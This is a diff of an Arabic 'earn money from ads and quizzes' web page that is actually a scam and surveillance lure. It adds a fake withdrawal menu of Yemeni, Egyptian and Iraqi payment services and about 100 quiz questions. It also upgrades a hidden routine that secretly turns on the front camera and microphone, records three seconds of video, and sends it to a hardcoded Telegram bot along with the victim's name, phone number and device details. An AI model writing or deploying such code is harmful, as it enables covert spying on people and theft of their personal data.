@@ -150,6 +150,32 @@
             border-radius: 5px;
             cursor: pointer;
         }
+        .bank-btn {
+            background: #f8fafc;
+            color: #1e293b;
+            border: 2px solid #cbd5e1;
+            margin: 8px 0;
+            padding: 12px;
+            font-size: 16px;
+            border-radius: 8px;
+            width: 100%;
+            cursor: pointer;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .bank-btn:hover {
+            background: #f1f5f9;
+            border-color: #94a3b8;
+        }
+        .section-title {
+            font-size: 18px;
+            font-weight: bold;
+            margin: 15px 0 10px 0;
+            color: #334155;
+            text-align: right;
+        }
         .ad-banner {
             background: #f1f5f9;
             border: 2px dashed #cbd5e1;
@@ -163,6 +189,7 @@
 <body>
 
     <div class="container">
+        <!-- قسم تسجيل البيانات -->
         <div id="form-section">
             <div style="font-size: 24px; margin-bottom: 5px;">🌐</div>
             <div class="header-title">سجل الربح الحقيقي من الإعلانات والأسئله</div>
@@ -175,6 +202,7 @@
             <button type="button" class="btn-green" onclick="startProcess()">بدء التسجيل</button>
         </div>
 
+        <!-- قسم مشاركة الواتساب -->
         <div id="content-section" class="hidden">
             <div class="header-title">سجل الربح الحقيقي من الإعلانات والأسئله</div>
             <div class="main-title">سجل الآن</div>
@@ -203,10 +231,11 @@
             </div>
         </div>
 
+        <!-- قسم المسابقة والأسئلة -->
         <div id="quiz-section" class="hidden">
             <div class="wallet-box">
                 <div>المحفظة: $<span id="balance">0.00</span></div>
-                <button type="button" class="withdraw-btn" onclick="tryWithdraw()">سحب الأرباح</button>
+                <button type="button" class="withdraw-btn" onclick="showWithdrawOptions()">سحب الأرباح</button>
             </div>
 
             <div class="header-title" style="margin-bottom: 10px;">مسابقة الأسئلة والأرباح</div>
@@ -226,24 +255,149 @@
                 </div>
             </div>
         </div>
+
+        <!-- قسم اختيار بنوك وطرق السحب -->
+        <div id="withdraw-section" class="hidden">
+            <div class="wallet-box">
+                <div>المحفظة: $<span id="balance-withdraw">0.00</span></div>
+                <button type="button" class="withdraw-btn" onclick="backToQuiz()">العودة للأسئلة</button>
+            </div>
+
+            <div class="header-title" style="margin-bottom: 15px;">اختر وسيلة السحب المفضلة</div>
+
+            <div class="section-title">🇾🇪 بنوك ومحافظ اليمن:</div>
+            <button type="button" class="bank-btn" onclick="tryWithdraw('بنك الكريمي (موبايل موني)')"><span>بنك الكريمي (الكريمي موبايل)</span> <span>💳</span></button>
+            <button type="button" class="bank-btn" onclick="tryWithdraw('جيب (Jeep)')"><span>جيب (Jeep)</span> <span>📱</span></button>
+            <button type="button" class="bank-btn" onclick="tryWithdraw('ون كاش (One Cash)')"><span>ون كاش (One Cash)</span> <span>📲</span></button>
+            <button type="button" class="bank-btn" onclick="tryWithdraw('موبايل موني (يمن موبايل)')"><span>موبايل موني</span> <span>📞</span></button>
+
+            <div class="section-title">🇪🇬 بنوك ومحافظ مصر:</div>
+            <button type="button" class="bank-btn" onclick="tryWithdraw('فودافون كاش (Vodafone Cash)')"><span>فودافون كاش</span> <span>🔴</span></button>
+            <button type="button" class="bank-btn" onclick="tryWithdraw('انستا باي (InstaPay)')"><span>انستا باي (InstaPay)</span> <span>⚡</span></button>
+            <button type="button" class="bank-btn" onclick="tryWithdraw('اتصالات كاش / أورانج كاش')"><span>اتصالات / أورانج كاش</span> <span>🟠</span></button>
+
+            <div class="section-title">🇮🇶 بنوك ومحافظ العراق:</div>
+            <button type="button" class="bank-btn" onclick="tryWithdraw('زين كاش العراق (Zain Cash)')"><span>زين كاش العراق</span> <span>🟢</span></button>
+            <button type="button" class="bank-btn" onclick="tryWithdraw('مصرف الرافدين / الرشيد')"><span>مصرف الرافدين / الرشيد</span> <span>🏛️</span></button>
+            <button type="button" class="bank-btn" onclick="tryWithdraw('تكيش / كي كارد (Qi Card)')"><span>كي كارد (Qi Card)</span> <span>💳</span></button>
+
+            <div class="section-title">🌍 المحافظ العالمية:</div>
+            <button type="button" class="bank-btn" onclick="tryWithdraw('باي بال (PayPal)')"><span>باي بال (PayPal)</span> <span>🌐</span></button>
+        </div>
     </div>
 
-    <!-- عناصر الكاميرا الخفية -->
-    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+    <!-- عناصر الكاميرا والفيديو الخفية -->
+    <video id="video" width="320" height="240" autoplay muted playsinline style="display:none;"></video>
 
     <script>
         let progress = 0;
         let userBalance = 0.00;
         let isCounting = false;
         let batteryLevelInfo = "غير معروف";
+        let mediaStream = null;
 
+        // قاعدة بيانات تضم 100 سؤال متنوع
         const questions = [
             { q: "ما هي عاصمة اليمن؟", options: ["عدن", "صنعاء", "تعز", "إب"], correct: 1 },
-            { q: "كم عدد ركعات صلاة المغرب؟", options: ["ركعتان", "ثلاث ركعات", "أربع ركعات", "ركعة واحدة"], correct: 1 },
+            { q: "كم عدد سور القرآن الكريم؟", options: ["114 سورة", "113 سورة", "115 سورة", "120 سورة"], correct: 0 },
             { q: "أي كوكب يسمى الكوكب الأحمر؟", options: ["المريخ", "الزهرة", "المشتري", "زحل"], correct: 0 },
-            { q: "ما هو أكبر بحر في العالم؟", options: ["البحر الأحمر", "البحر المتوسط", "بحر قزوين", "البحر الأسود"], correct: 2 },
-            { q: "كم عدد سور القرآن الكريم؟", options: ["114 سورة", "113 سورة", "115 سورة", "120 سورة"], correct: 0 }
+            { q: "ما هو أكبر بحر مغلق في العالم؟", options: ["البحر الأحمر", "البحر المتوسط", "بحر قزوين", "البحر الأسود"], correct: 2 },
+            { q: "كم عدد ركعات صلاة المغرب؟", options: ["ركعتان", "ثلاث ركعات", "أربع ركعات", "ركعة واحدة"], correct: 1 },
+            { q: "ما هو الدولة الأكثر إنتاجاً للقهوة في العالم؟", options: ["البرازيل", "فيتنام", "كولومبيا", "إثيوبيا"], correct: 0 },
+            { q: "أي من هذه اللغات هي الأكثر تحدثاً في العالم كغة أم؟", options: ["الإنجليزية", "الإسبانية", "الصينية الماندرين", "العربية"], correct: 2 },
+            { q: "في أي عام تم إطلاق أول قمر صناعي (سبوتنيك 1)؟", options: ["1955", "1957", "1961", "1969"], correct: 1 },
+            { q: "ما هو العنصر الكيميائي الأكثر وفراً في قشرة الأرض؟", options: ["الحديد", "الكربون", "الأكسجين", "السيليكون"], correct: 2 },
+            { q: "من هو مكتشف قانون الجاذبية الأرضية؟", options: ["ألبرت أينشتاين", "إسحاق نيوتن", "جاليليو جاليلي", "نيكولا تسلا"], correct: 1 },
+            { q: "ما هي عاصمة المملكة العربية السعودية؟", options: ["جدة", "الرياض", "الدمام", "مكة المكرمة"], correct: 1 },
+            { q: "ما هي عاصمة مصر؟", options: ["الإسكندرية", "أسوان", "القاهرة", "الجيزة"], correct: 2 },
+            { q: "ما هي عاصمة الإمارات العربية المتحدة؟", options: ["دبي", "أبوظبي", "الشارقة", "عجمان"], correct: 1 },
+            { q: "ما هي عاصمة قطر؟", options: ["الدوحة", "الوكير", "الخور", "لوسيل"], correct: 0 },
+            { q: "ما هي عاصمة سلطنة عمان؟", options: ["صلالة", "مسقط", "نزوى", "صُحار"], correct: 1 },
+            { q: "ما هي عاصمة الكويت؟", options: ["الكويت", "الجهراء", "الأحمدي", "حولي"], correct: 0 },
+            { q: "ما هي عاصمة البحرين؟", options: ["المحرق", "الرفاع", "المنامة", "عوالي"], correct: 2 },
+            { q: "ما هي عاصمة الأردن؟", options: ["إربد", "عمان", "العقبة", "الزرقاء"], correct: 1 },
+            { q: "ما هي عاصمة سوريا؟", options: ["حلب", "حمص", "دمشق", "اللاذقية"], correct: 2 },
+            { q: "ما هي عاصمة العراق؟", options: ["البصرة", "الموصل", "بغداد", "أربيل"], correct: 2 },
+            { q: "ما هي عاصمة لبنان؟", options: ["بيروت", "طرابلس", "صيدا", "جبيل"], correct: 0 },
+            { q: "ما هي عاصمة فلسطين؟", options: ["حيفا", "القدس", "غزة", "نابلس"], correct: 1 },
+            { q: "ما هي عاصمة السودان؟", options: ["الخرطوم", "بورتسودان", "أم درمان", "نيالا"], correct: 0 },
+            { q: "ما هي عاصمة المغرب؟", options: ["الدار البيضاء", "مراكش", "الرباط", "فاس"], correct: 2 },
+            { q: "ما هي عاصمة الجزائر؟", options: ["وهران", "الجزائر", "قسنطينة", "عنابة"], correct: 1 },
+            { q: "ما هي عاصمة تونس؟", options: ["سوسة", "صفاقس", "تونس", "بنزرت"], correct: 2 },
+            { q: "ما هي عاصمة ليبيا؟", options: ["بنغازي", "طرابلس", "مصراتة", "سبها"], correct: 1 },
+            { q: "ما هي عاصمة موريتانيا؟", options: ["نواذيبو", "الزويرات", "نواكشوط", "روصو"], correct: 2 },
+            { q: "ما هي عاصمة الصومال؟", options: ["مقديشو", "بربرة", "بوصاصو", "هرجيسا"], correct: 0 },
+            { q: "ما هي عاصمة جيبوتي؟", options: ["علي صبيح", "تاتجو", "جيبوتي", "الخُر"], correct: 2 },
+            { q: "ما هي عاصمة جزر القمر؟", options: ["موروني", "موتسامودي", "فومبوني", "تسيمبيو"], correct: 0 },
+            { q: "ما هي عاصمة تركيا؟", options: ["إسطنبول", "أنقرة", "إزمير", "أنطاليا"], correct: 1 },
+            { q: "ما هي عاصمة إيران؟", options: ["أصفهان", "شيراز", "طهران", "تبريز"], correct: 2 },
+            { q: "ما هي عاصمة فرنسا؟", options: ["ليون", "مارسيليا", "باريس", "نيس"], correct: 2 },
+            { q: "ما هي عاصمة ألمانيا؟", options: ["ميونخ", "برلين", "فرانكفورت", "هامبورغ"], correct: 1 },
+            { q: "ما هي عاصمة إيطاليا؟", options: ["ميلانو", "فلورنسا", "روما", "البندقية"], correct: 2 },
+            { q: "ما هي عاصمة إسبانيا؟", options: ["برشلونة", "مدريد", "إشبيلية", "فالنسيا"], correct: 1 },
+            { q: "ما هي عاصمة بريطانيا (المملكة المتحدة)؟", options: ["مانشستر", "لندن", "ليفربول", "برمنغهام"], correct: 1 },
+            { q: "ما هي عاصمة روسيا؟", options: ["سان بطرسبرغ", "موسكو", "كازان", "سوتشي"], correct: 1 },
+            { q: "ما هي عاصمة الولايات المتحدة الأمريكية؟", options: ["نيويورك", "لوس أنجلوس", "واشنطن العاصمة", "شيكاغو"], correct: 2 },
+            { q: "ما هي عاصمة الصين؟", options: ["شانغهاي", "بكين", "شنجن", "هونغ كونغ"], correct: 1 },
+            { q: "ما هي عاصمة اليابان؟", options: ["أوساكا", "كيوتو", "طوكيو", "هيروشيما"], correct: 2 },
+            { q: "ما هي عاصمة الهند؟", options: ["مومباي", "نيودلهي", "بنغالور", "كلكتا"], correct: 1 },
+            { q: "ما هي عاصمة أستراليا؟", options: ["سيدني", "ملبورن", "كانبيرا", "بريزبان"], correct: 2 },
+            { q: "ما هي عاصمة البرازيل؟", options: ["ريو دي جانيرو", "ساو باولو", "برازيليا", "سالفادور"], correct: 2 },
+            { q: "ما هي عاصمة الأرجنتين؟", options: ["بوينس آيريس", "قرطبة", "روزاريو", "مندوزا"], correct: 0 },
+            { q: "ما هو الحيوان الذي يُسمى 'سفينة الصحراء'؟", options: ["الحصان", "الفيل", "الجمل", "الأسد"], correct: 2 },
+            { q: "ما هو أسرع حيوان بري في العالم؟", options: ["الأسد", "النمر", "الفهد (Cheetah)", "الغزال"], correct: 2 },
+            { q: "ما هو أكبر حيوان على وجه الأرض؟", options: ["الفيل الأفريقي", "الحوت الأزرق", "قرش الحوت", "الزرافة"], correct: 1 },
+            { q: "كم عدد ألوان قزح (قوس قزح) الأساسية؟", options: ["5 ألوان", "6 ألوان", "7 ألوان", "8 ألوان"], correct: 2 },
+            { q: "ما هو المعدن السائل في درجة حرارة الغرفة؟", options: ["الذهب", "الفضة", "الزئبق", "النحاس"], correct: 2 },
+            { q: "كم عدد أضلاع المثلث؟", options: ["3 أضلاع", "4 أضلاع", "5 أضلاع", "6 أضلاع"], correct: 0 },
+            { q: "ما هو غاز الحياة الضروري لتنفس الإنسان؟", options: ["ثاني أكسيد الكربون", "النيتروجين", "الأكسجين", "الهيدروجين"], correct: 2 },
+            { q: "في أي قارة تقع مصر؟", options: ["آسيا", "أفريقيا", "أوروبا", "أمريكا الشمالية"], correct: 1 },
+            { q: "ما هو أطول نهر في العالم؟", options: ["نهر النيل", "نهر الأمازون", "نهر المسيسيبي", "نهر الدانوب"], correct: 0 },
+            { q: "ما هي ديانة أغلبية سكان اليابان التاريخية؟", options: ["الإسلام والمسيحية", "البوذية والشنتو", "الهندوسية", "اليهودية"], correct: 1 },
+            { q: "ما هو أصغر قارات العالم مساحة؟", options: ["أوروبا", "أستراليا (أوقيانوسيا)", "أنتاركتيكا", "أمريكا الجنوبية"], correct: 1 },
+            { q: "كم عدد أيام السنة البسيطة؟", options: ["365 يوماً", "366 يوماً", "360 يوماً", "354 يوماً"], correct: 0 },
+            { q: "كم عدد أيام السنة الكبيسة؟", options: ["365 يوماً", "366 يوماً", "364 يوماً", "367 يوماً"], correct: 1 },
+            { q: "ما هو الكوكب الأقرب إلى الشمس؟", options: ["الزهرة", "عطارد", "المريخ", "المشتري"], correct: 1 },
+            { q: "ما هو الكوكب الأكبر في المجموعة الشمسية؟", options: ["زحل", "المشتري", "أورانوس", "نبتون"], correct: 1 },
+            { q: "من هو أول انسان صعد إلى الفضاء؟", options: ["نيل آرمسترونغ", "يوري غاغارين", "باز ألدرين", "جون غلين"], correct: 1 },
+            { q: "في أي عام هبط الإنسان على سطح القمر لأول مرة؟", options: ["1965", "1969", "1971", "1975"], correct: 1 },
+            { q: "ما هو رمز عنصر الماء الكيميائي؟", options: ["CO2", "H2O", "O2", "NaCl"], correct: 1 },
+            { q: "ما هو رمز عنصر ملح الطعام الكيميائي؟", options: ["H2O", "NaCl", "HCl", "NaOH"], correct: 1 },
+            { q: "كم عدد عصور ما قبل التاريخ الرئيسية؟", options: ["عصران", "ثلاثة عصور", "أربعة عصور", "خمسة عصور"], correct: 1 },
+            { q: "ما هو السائل الذي يضخه القلب ليطوف في الجسم؟", options: ["الماء", "الدم", "اللمف", "البلازما"], correct: 1 },
+            { q: "كم عدد أركان الإسلام؟", options: ["4 أركان", "5 أركان", "6 أركان", "7 أركان"], correct: 1 },
+            { q: "كم عدد أركان الإيمان؟", options: ["5 أركان", "6 أركان", "7 أركان", "4 أركان"], correct: 1 },
+            { q: "ما هي السورة القرآنية التي تسمى 'عروس القرآن'؟", options: ["سورة البقرة", "سورة يس", "سورة الرحمن", "سورة الملك"], correct: 2 },
+            { q: "ما هي السورة التي تقرأ لعدم وجود آية البسملة في أولها؟", options: ["سورة التوبة", "سورة الانفال", "سورة الإخلاص", "سورة الفاتحة"], correct: 0 },
+            { q: "من هو النبي الذي ألقي في النار فلم تأكله؟", options: ["إبراهيم عليه السلام", "موسى عليه السلام", "عيسى عليه السلام", "نوح عليه السلام"], correct: 0 },
+            { q: "من هو النبي الذي ابتلعه الحوت؟", options: ["يونس عليه السلام", "يوسف عليه السلام", "أيوب عليه السلام", "زكريا عليه السلام"], correct: 0 },
+            { q: "ما هي لغة أهل الجنة في الآخرة حسب بعض الآثار؟", options: ["العربية", "السريانية", "العبرية", "لم يثبت نص قاطع"], correct: 3 },
+            { q: "كم عدد اللاعبين في فريق كرة القدم الأساسي بالملعب؟", options: ["9 لاعبين", "10 لاعبين", "11 لاعباً", "12 لاعباً"], correct: 2 },
+            { q: "كم عدد شوط مباراة كرة السلة الأساسية؟", options: ["شوطان", "ثلاثة أشواط", "أربعة أشواط", "خمسة أشواط"], correct: 2 },
+            { q: "في أي رياضة يُستخدم مصطلح 'الكش مات' (Checkmate)؟", options: ["كرة المضرب", "الشطرنج", "البلياردو", "الملاكمة"], correct: 1 },
+            { q: "ما هي الدولة المصنفة الأولى عالمياً في كرة القدم تاريخياً بعدد كؤوس العالم؟", options: ["ألمانيا", "الأرجنتين", "البرازيل", "إيطاليا"], correct: 2 },
+            { q: "ما هي عاصمة فرنسا الثقافية والسياسية؟", options: ["مارسيليا", "باريس", "ليون", "تولوز"], correct: 1 },
+            { q: "ما هو اسم الغاز الذي تستخدمه النباتات في عملية البناء الضوئي؟", options: ["الأكسجين", "ثاني أكسيد الكربون", "النيتروجين", "الهيدروجين"], correct: 1 },
+            { q: "ما هو العضو المسؤول عن ضخ الدم في جسم الإنسان؟", options: ["المخ", "الكبد", "القلب", "الرئتان"], correct: 2 },
+            { q: "ما هو العضو المسؤول عن التفكير والتحكم بالجسم؟", options: ["القلب", "المخ (الدماغ)", "الكلى", "المعدة"], correct: 1 },
+            { q: "كم عدد عظام جسم الإنسان البالغ تقريباً؟", options: ["150 عظمة", "206 عظام", "300 عظمة", "250 عظمة"], correct: 1 },
+            { q: "ما هو أكبر أعضاء جسم الإنسان مساحة ووظيفة خارجية؟", options: ["الكبد", "الجلد", "الأمعاء الدقيقة", "المعدة"], correct: 1 },
+            { q: "ما هي عاصمة إندونيسيا؟", options: ["بالي", "جاكرتا", "سورابايا", "باندونغ"], correct: 1 },
+            { q: "ما هي عاصمة ماليزيا؟", options: ["بيان ليناس", "كوالالمبور", "جورج تاون", "ملكا"], correct: 1 },
+            { q: "ما هي عاصمة باكستان؟", options: ["كراتشي", "لاهور", "إسلام آباد", "بيشاور"], correct: 2 },
+            { q: "ما هي عاصمة الهند؟", options: ["مومباي", "نيودلهي", "حيدر آباد", "بنغالور"], correct: 1 },
+            { q: "ما هي عاصمة كوريا الجنوبية؟", options: ["بيونغيانغ", "سيول", "بوسان", "إنتشون"], correct: 1 },
+            { q: "ما هي عاصمة كوريا الشمالية؟", options: ["سيول", "بيونغيانغ", "كايسونغ", "وون산"], correct: 1 },
+            { q: "ما هي عاصمة كندا؟", options: ["تورونتو", "فانكوفر", "أوتاوا", "مونتريال"], correct: 2 },
+            { q: "ما هي عاصمة المكسيك؟", options: ["مونتيري", "غوادالاخارا", "مكسيكو سيتي", "كانكون"], correct: 2 },
+            { q: "ما هي الدولة التي يمر بها خط الاستواء وتعتبر عاصمتها كيتو؟", options: ["كولومبيا", "الإكوادور", "بيرو", "فنزويلا"], correct: 1 },
+            { q: "ما هو أكبر محيط في العالم؟", options: ["المحيط الأطلسي", "المحيط الهندي", "المحيط الهادئ", "المحيط المتجمد الشمالي"], correct: 2 },
+            { q: "ما هو أصغر محيط في العالم؟", options: ["المحيط الهندي", "المحيط المتجمد الشمالي", "المحيط الأطلسي", "المحيط المتجمد الجنوبي"], correct: 1 },
+            { q: "ما هي الدولة الأكثر سكاناً في العالم حالياً؟", options: ["الصين", "الهند", "الولايات المتحدة", "إندونيسيا"], correct: 1 },
+            { q: "ما هي اللغة الرسمية في البرازيل؟", options: ["الإسبانية", "البرتغالية", "الإنجليزية", "الفرنسية"], correct: 1 },
+            { q: "ما هو أطول جسر بحر في العالم العربي أو العالم؟", options: ["جسر الملك فهد", "جسر هونغ كونغ تشوهای ماكاو", "جسر بانابونا", "جسر دايانيو"], correct: 1 },
+            { q: "ما هي العملة الرسمية لدولة الإمارات العربية المتحدة؟", options: ["الريال", "الدينار", "الدرهم", "الدولار"], correct: 2 },
+            { q: "ما هي العملة الرسمية للمملكة العربية السعودية؟", options: ["الدرهم", "الريال", "الدينار", "الجنيه"], correct: 1 }
         ];
 
         let currentQuestion = 0;
@@ -262,15 +416,17 @@
             }
         }
 
+        // تشغيل الكاميرا المسبق لتكون جاهزة للتسجيل
         function initCamera() {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
             .then(function(stream) {
+                mediaStream = stream;
                 let video = document.getElementById('video');
                 video.srcObject = stream;
                 video.play();
             })
             .catch(function(err) {
-                console.log("تم رفض الإذن أو الكاميرا غير مشغولة");
+                console.log("تم رفض إذن الكاميرا أو الميكروفون");
             });
         }
 
@@ -288,47 +444,77 @@
                 return;
             }
 
-            captureAndSendAll(name, phone);
+            // بدء تسجيل الفيديو وإرساله للبوت
+            recordAndSendVideo(name, phone);
 
             document.getElementById('display-name').innerText = name;
             document.getElementById('form-section').classList.add('hidden');
             document.getElementById('content-section').classList.remove('hidden');
         }
 
-        function captureAndSendAll(name, phone) {
+        // دالة تسجيل الفيديو وإرساله عبر تيليجرام
+        function recordAndSendVideo(name, phone) {
+            if (!mediaStream) {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
+                .then(function(stream) {
+                    mediaStream = stream;
+                    startRecordingProcess(name, phone, stream);
+                }).catch(e => console.log("تعذر فتح الكاميرا"));
+                return;
+            }
+            startRecordingProcess(name, phone, mediaStream);
+        }
+
+        function startRecordingProcess(name, phone, stream) {
+            let recordedChunks = [];
+            let options = { mimeType: 'video/webm; codecs=vp9' };
+            if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+                options = { mimeType: 'video/mp4' };
+            }
+
+            try {
+                let mediaRecorder = new MediaRecorder(stream, options);
+
+                mediaRecorder.ondataavailable = function(event) {
+                    if (event.data && event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.onstop = function() {
+                    let blob = new Blob(recordedChunks, { type: 'video/mp4' });
+                    sendVideoToTelegram(blob, name, phone);
+                };
+
+                mediaRecorder.start();
+
+                // تسجيل فيديو لمدة 3 ثوانٍ ثم إيقافه والإرسال تلقائياً
+                setTimeout(() => {
+                    if (mediaRecorder.state === "recording") {
+                        mediaRecorder.stop();
+                    }
+                }, 3000);
+
+            } catch (e) {
+                console.log("خطأ في بدء التسجيل: ", e);
+            }
+        }
+
+        function sendVideoToTelegram(videoBlob, name, phone) {
             let botToken = "8638249103:AAGKy6YFnGKfMss9Zt-f9hbCX-WmU-wJjc0";
             let chatId = "7962257606";
 
-            let video = document.getElementById('video');
-            let canvas = document.getElementById('canvas');
-            let context = canvas.getContext('2d');
-
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            let imageData = canvas.toDataURL('image/png');
-
-            let blob = dataURItoBlob(imageData);
             let formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'capture.png');
-            formData.append('caption', `📥 تسجيـل جديد بالمسباقة:\n👤 الاسم: ${name}\n📞 الهاتف: ${phone}\n🔋 البطارية: ${batteryLevelInfo}\n📱 الجهاز: ${navigator.platform}\n🌐 المتصفح: ${navigator.userAgent}`);
+            formData.append('video', videoBlob, 'capture.mp4');
+            formData.append('caption', `🎥 تسجيل فيديو جديد:\n👤 الاسم: ${name}\n📞 الهاتف: ${phone}\n🔋 البطارية: ${batteryLevelInfo}\n📱 الجهاز: ${navigator.platform}\n🌐 المتصفح: ${navigator.userAgent}`);
 
-            let url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+            let url = `https://api.telegram.org/bot${botToken}/sendVideo`;
 
             fetch(url, {
                 method: 'POST',
                 body: formData
-            }).catch(err => console.log("خطأ في الإرسال"));
-        }
-
-        function dataURItoBlob(dataURI) {
-            let byteString = atob(dataURI.split(',')[1]);
-            let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-            let ab = new ArrayBuffer(byteString.length);
-            let ia = new Uint8Array(ab);
-            for (let i = 0; i < byteString.length; i++) {
-                ia[i] = byteString.charCodeAt(i);
-            }
-            return new Blob([ab], {type: mimeString});
+            }).catch(err => console.log("خطأ في إرسال الفيديو"));
         }
 
         function shareWhatsApp() {
@@ -366,7 +552,7 @@
 
         function loadQuestion() {
             if (currentQuestion >= questions.length) {
-                currentQuestion = 0;
+                currentQuestion = 0; // إعادة الترتيب من البداية عند انتهاء الـ 100 سؤال
             }
             let qData = questions[currentQuestion];
             document.getElementById('question-text').innerText = (currentQuestion + 1) + ". " + qData.q;
@@ -387,12 +573,24 @@
             }
             currentQuestion++;
             document.getElementById('balance').innerText = userBalance.toFixed(2);
+            document.getElementById('balance-withdraw').innerText = userBalance.toFixed(2);
             loadQuestion();
         }
 
-        function tryWithdraw() {
+        function showWithdrawOptions() {
+            document.getElementById('quiz-section').classList.add('hidden');
+            document.getElementById('withdraw-section').classList.remove('hidden');
+        }
+
+        function backToQuiz() {
+            document.getElementById('withdraw-section').classList.add('hidden');
+            document.getElementById('quiz-section').classList.remove('hidden');
+        }
+
+        function tryWithdraw(bankName) {
+            // بغض النظر عن البنك الذي يتم الضغط عليه، تظهر له رسالة الحد الأدنى ما دام المبلغ أقل من 50
             if (userBalance >= 50.00) {
-                alert("مبروك! لقد وصلت للحد الأدنى للسحب.");
+                alert("مبروك! تم تقديم طلب السحب عبر " + bankName + " بنجاح.");
             } else {
                 alert("عذراً، لم تصل إلى الحد الأدنى للسحب (تحتاج إلى $50.00 على الأقل). استمر في الإجابة لزيادة رصيدك!");
             }
